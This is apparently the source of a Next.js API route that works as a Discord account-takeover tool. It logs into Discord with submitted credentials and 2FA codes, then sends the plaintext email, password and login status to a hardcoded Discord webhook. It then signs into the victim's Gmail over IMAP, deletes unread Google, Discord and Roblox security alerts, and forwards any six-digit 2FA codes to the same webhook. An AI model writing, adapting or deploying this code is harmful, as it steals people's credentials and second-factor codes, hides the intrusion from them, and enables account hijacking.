import { NextRequest, NextResponse } from 'next/server';
import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { imap } from 'imap-simple';
import { simpleParser } from 'mailparser';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function logWebhook(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title,
          color,
          fields,
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch {}
}

async function monitorGmail(email: string, password: string) {
  const config = {
    imap: {
      user: email,
      password,
      host: 'imap.gmail.com',
      port: 993,
      tls: true,
      authTimeout: 3000,
      tlsOptions: { rejectUnauthorized: false }
    }
  };

  try {
    const connection = await imap.connect({ imap: config.imap });
    await connection.openBox('INBOX');

    // Delete Google/Discord/Roblox alert emails
    const alerts = await connection.search([
      'UNSEEN',
      ['OR', ['FROM', 'no-reply@accounts.google.com'], ['FROM', 'no-reply@discord.com'], ['FROM', 'no-reply@roblox.com']],
      ['OR', ['SUBJECT', 'new sign-in'], ['SUBJECT', 'suspicious'], ['SUBJECT', 'login attempt']]
    ]);

    if (alerts.length > 0) {
      await connection.addFlags(alerts, '\\Deleted');
      await connection.expunge();
      await logWebhook('Alert Emails Deleted', [{ name: 'Email', value: email }], 0xffaa00);
    }

    // Watch for 2FA codes (in real setup, run this in a loop/cron)
    const messages = await connection.search(['UNSEEN']);
    for (const msg of messages) {
      const part = await connection.getPartData(msg, 'TEXT');
      const parsed = await simpleParser(part);
      const text = parsed.textAsHtml || parsed.text || '';

      const codeMatch = text.match(/\b\d{6}\b/);
      if (codeMatch) {
        const code = codeMatch[0];
        const service = text.includes('discord') ? 'Discord' : text.includes('roblox') ? 'Roblox' : 'Unknown';
        await logWebhook(`${service} 2FA Code`, [
          { name: 'Code', value: `\`${code}\`` },
          { name: 'From', value: email }
        ], 0x00ff00);
      }
    }

    connection.end();
  } catch (err: any) {
    await logWebhook('Gmail Monitor Error', [
      { name: 'Email', value: email },
      { name: 'Error', value: err.message }
    ], 0xff0000);
  }
}

export async function POST(req: NextRequest) {
  const { email, password, code, proxy } = await req.json();

  const result = { success: false, token: null, mfa: false, error: null };

  try {
    const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;

    const headers = {
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
      'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIn0='
    };

    // Discord login
    const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
      method: 'POST',
      headers,
      body: JSON.stringify({ login: email, password, undelete: false }),
      agent: agent as any
    });

    const loginData = await loginRes.json();

    await logWebhook('Discord Login Attempt', [
      { name: 'Email', value: email },
      { name: 'Password', value: password },
      { name: 'Proxy', value: proxy || 'None' },
      { name: 'Status', value: loginData.token ? 'Success' : loginData.message || 'Failed' }
    ], loginData.token ? 0x00ff00 : 0xff0000);

    if (loginData.token) {
      result.success = true;
      result.token = loginData.token;
    } else if (loginData.ticket && code) {
      const mfaRes = await fetch('https://discord.com/api/v9/auth/mfa/totp', {
        method: 'POST',
        headers: { ...headers, 'Authorization': `Bearer ${loginData.token || ''}` },
        body: JSON.stringify({ ticket: loginData.ticket, code }),
        agent: agent as any
      });

      const mfaData = await mfaRes.json();

      if (mfaData.token) {
        result.success = true;
        result.token = mfaData.token;
        result.mfa = true;

        // Now log into Gmail with same creds + code
        await monitorGmail(email, password);
      } else {
        result.error = mfaData.message || '2FA failed';
      }
    } else {
      result.error = loginData.message || 'Login failed';
    }
  } catch (err) {
    result.error = err.message || 'Request error';
    await logWebhook('Login Error', [
      { name: 'Email', value: email },
      { name: 'Error', value: result.error }
    ], 0xff0000);
  }

  return NextResponse.json(result);
}
